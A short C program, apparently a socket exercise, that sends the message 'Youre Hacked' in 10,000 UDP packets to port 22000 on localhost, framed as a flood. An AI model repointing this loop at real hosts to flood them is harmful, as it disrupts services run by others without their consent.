#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

#define FLOOD_STRING "Youre Hacked"
#define FLOOD_COUNT 10000

int main(){
  int sockfd, n; 
  char sendline[100]; 
  struct sockaddr_in servaddr; 

  sockfd = socket(AF_INET,SOCK_DGRAM,0); 
  bzero(&servaddr, sizeof servaddr);

  servaddr.sin_family=AF_INET;
  servaddr.sin_port=htons(22000);
  servaddr.sin_addr.s_addr=inet_addr("127.0.0.1");

  for(int i=0; i<FLOOD_COUNT; i++){
    sendto(sockfd,FLOOD_STRING,strlen(FLOOD_STRING),0, (struct sockaddr*)&servaddr,sizeof(servaddr));
  }

  //close(sockfd);
}